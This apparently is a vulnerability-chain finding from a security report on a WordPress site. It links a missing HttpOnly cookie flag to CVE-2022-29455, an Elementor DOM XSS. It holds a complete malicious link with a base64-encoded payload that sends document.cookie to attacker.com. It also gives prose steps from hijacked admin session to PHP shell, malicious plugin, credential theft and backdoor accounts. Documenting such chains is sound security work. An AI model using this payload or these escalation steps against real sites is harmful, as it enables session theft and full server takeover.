Vulnerability Chain

Step 1: Cookie Missing HttpOnly + Secure flags

The cookiesession1 cookie is accessible via JavaScript and sent over HTTP.

This means any XSS vulnerability can steal it.

Step 2: CVE-2022-29455 — Elementor DOM XSS (Unauthenticated)

Send this link to an admin:

{{ base_url }}/#elementor-action:action=lightbox&settings=eyJodG1sIjoiPGltZyBzcmM9eCBvbmVycm9yPWZldGNoKCdodHRwczovL2F0dGFja2VyLmNvbS9zdGVhbD9jPScrZG9jdW1lbnQuY29va2llKT4ifQ==

When clicked, the XSS payload steals their session cookie and sends it to attacker.com.

Step 3: Session Hijack

Attacker receives the cookie at https://attacker.com/steal?c=COOKIE_VALUE

Attacker sets this cookie in their browser → logged in as admin.

Step 4: WordPress Admin → Remote Code Execution

With admin access, the attacker can:

  • Edit theme/plugin PHP files via Appearance → Theme Editor → inject PHP shell
  • Upload a malicious plugin → execute arbitrary commands on the server
  • Access wp-config.php → steal database credentials
  • Create backdoor admin accounts for persistence

Impact: FULL SERVER COMPROMISE

Starting from a single clicked link → Admin access → RCE → Database access → Lateral movement
